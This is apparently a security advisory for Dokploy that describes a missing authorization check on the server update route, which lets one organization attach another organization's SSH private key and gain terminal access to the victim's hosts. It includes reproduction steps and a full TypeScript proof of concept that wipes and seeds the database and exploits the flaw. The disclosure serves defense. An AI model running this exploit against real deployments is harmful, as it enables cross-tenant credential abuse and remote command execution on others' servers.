### Summary
Dokploy allows an authenticated user to update a server object with an arbitrary `sshKeyId`. The update path verifies that the target server belongs to the active organization, but it does not verify that the supplied SSH key belongs to the same organization. As a result, a user can attach another organization's SSH key to a server they control.

This is similar with **CVE-2025-22609**. In the original vulnerability, a missing authorization check allowed an authenticated user to attach an existing private key from the Coolify instance to their own server and then use terminal access to execute commands on an SSH target that accepted that key.

### Details
1. The server update route authorizes the server, but not the supplied SSH key.

```ts
const server = await findServerById(input.serverId);
if (server.organizationId !== ctx.session.activeOrganizationId) {
  throw new TRPCError({
    code: "UNAUTHORIZED",
    message: "You are not authorized to update this server",
  });
}

const currentServer = await updateServerById(input.serverId, {
  ...input,
});
```

The source is attacker-controlled `sshKeyId` in the `server.update` mutation input. The route only checks `server.organizationId`; it does not load the referenced SSH key and compare `sshKey.organizationId` with `ctx.session.activeOrganizationId`.

2. The service writes the supplied fields directly.

```ts
const result = await db
  .update(server)
  .set({
    ...serverData,
  })
  .where(eq(server.serverId, serverId))
  .returning()
  .then((res) => res[0]);
```

The sink is the server table update. Because `sshKeyId` is included in the accepted update schema, a foreign key to another organization's SSH key can be persisted on an attacker-controlled server.

3. Terminal access later trusts the server's SSH key relation.

```ts
const { ipAddress: host, port, username, sshKey, sshKeyId } = server;

if (!sshKeyId) {
  throw new Error("No SSH key available for this server");
}

connectionDetails = {
  host,
  port,
  username,
  privateKey: sshKey?.privateKey,
};
```

The impact sink is terminal SSH connection setup. Once the cross-organization key is attached, terminal code uses `server.sshKey.privateKey` for the SSH session.

### How to reproduce
1. Prepare two organizations in the same Dokploy instance.
2. In the victim organization, create an SSH key.
3. In the attacker organization, create or select a server object.
4. As a user in the attacker organization, call the `server.update` mutation for the attacker-owned server and set `sshKeyId` to the victim organization's SSH key ID.
5. Query the updated server.

- Expected secure behavior: the mutation rejects the request because the SSH key belongs to a different organization.
- Observed vulnerable behavior: the mutation succeeds and the attacker-owned server row references the victim organization's SSH key. In the reproduced latest-source run, the resulting state was:

```json
{
  "serverOrganizationId": "org-attacker",
  "attachedSshKeyId": "victim-key-id",
  "attachedSshKeyOrganizationId": "org-victim",
  "vulnerable": true
}
```

### Example PoC
```
import { db } from "@dokploy/server/db";
import {
  member,
  organization,
  server,
  sshKeys,
  user,
} from "@dokploy/server/db/schema";
import { eq } from "drizzle-orm";
import { appRouter } from "./server/api/root";

const now = new Date();
const orgA = "org-attacker";
const orgB = "org-victim";
const attackerUser = "user-attacker";
const victimUser = "user-victim";
const victimKey = "victim-key-id";
const attackerServer = "attacker-server-id";

async function main() {
  await db.delete(server);
  await db.delete(sshKeys);
  await db.delete(member);
  await db.delete(organization);
  await db.delete(user);

  await db.insert(user).values([
    {
      id: attackerUser,
      email: "attacker@example.test",
      emailVerified: true,
      updatedAt: now,
      role: "owner",
      serversQuantity: 10,
    },
    {
      id: victimUser,
      email: "victim@example.test",
      emailVerified: true,
      updatedAt: now,
      role: "owner",
      serversQuantity: 10,
    },
  ]);

  await db.insert(organization).values([
    {
      id: orgA,
      name: "Attacker Org",
      slug: "attacker-org",
      ownerId: attackerUser,
      createdAt: now,
    },
    {
      id: orgB,
      name: "Victim Org",
      slug: "victim-org",
      ownerId: victimUser,
      createdAt: now,
    },
  ]);

  await db.insert(member).values([
    {
      id: "member-attacker",
      organizationId: orgA,
      userId: attackerUser,
      role: "owner",
      createdAt: now,
    },
    {
      id: "member-victim",
      organizationId: orgB,
      userId: victimUser,
      role: "owner",
      createdAt: now,
    },
  ]);

  await db.insert(sshKeys).values({
    sshKeyId: victimKey,
    organizationId: orgB,
    name: "Victim private key",
    publicKey: "ssh-rsa AAAATEST victim@example.test",
    privateKey:
      "-----BEGIN OPENSSH PRIVATE KEY-----\nnot-a-real-key-for-routing-test\n-----END OPENSSH PRIVATE KEY-----\n",
  });

  await db.insert(server).values({
    serverId: attackerServer,
    organizationId: orgA,
    name: "Attacker controlled server",
    ipAddress: "127.0.0.1",
    port: 22,
    username: "root",
    createdAt: now.toISOString(),
    sshKeyId: null,
  });

  const caller = appRouter.createCaller({
    session: {
      id: "session-attacker",
      userId: attackerUser,
      activeOrganizationId: orgA,
      expiresAt: new Date(Date.now() + 3600_000),
      token: "session-token",
      createdAt: now,
      updatedAt: now,
      ipAddress: "127.0.0.1",
      userAgent: "variant-test",
    },
    user: {
      id: attackerUser,
      email: "attacker@example.test",
      emailVerified: true,
      name: "Attacker",
      createdAt: now,
      updatedAt: now,
      role: "owner",
      ownerId: attackerUser,
      enableEnterpriseFeatures: false,
      isValidEnterpriseLicense: false,
    },
    db,
    req: {} as any,
    res: {} as any,
  });

  await caller.server.update({
    serverId: attackerServer,
    name: "Attacker controlled server",
    description: "",
    ipAddress: "127.0.0.1",
    port: 22,
    username: "root",
    sshKeyId: victimKey,
    serverType: "deploy",
    enableDockerCleanup: true,
  });

  const updated = await db.query.server.findFirst({
    where: eq(server.serverId, attackerServer),
    with: { sshKey: true },
  });

  const vulnerable =
    updated?.organizationId === orgA &&
    updated?.sshKeyId === victimKey &&
    updated?.sshKey?.organizationId === orgB;

  console.log(
    JSON.stringify(
      {
        serverOrganizationId: updated?.organizationId,
        attachedSshKeyId: updated?.sshKeyId,
        attachedSshKeyOrganizationId: updated?.sshKey?.organizationId,
        vulnerable,
      },
      null,
      2,
    ),
  );

  process.exit(vulnerable ? 0 : 1);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
```

### Impact
An attacker who can update a server can attach another organization's SSH key to their own server record. If the attacker configures the server host, port, and username to match an SSH target that accepts the victim key, the attacker can use Dokploy's terminal functionality to authenticate with that private key and execute commands on the target host.

This can lead to cross-tenant credential abuse, remote command execution on managed servers, and compromise of confidentiality, integrity, and availability of the SSH target.
